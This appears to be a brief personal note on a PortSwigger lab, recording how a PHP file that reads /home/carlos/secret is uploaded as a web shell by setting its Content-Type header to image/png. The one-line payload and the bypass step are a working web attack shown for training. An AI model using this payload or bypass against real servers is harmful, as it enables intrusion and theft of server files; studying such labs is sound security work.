# Web shell upload via Content-Type restriction bypass

Source: Portswigger
Tools: Burpsuite
Technique: FIle upload
Fields: Web

- Upload php file ( <?php echo file_get_contents('/home/carlos/secret'); ?> ) with Content-Type header: image/png → successful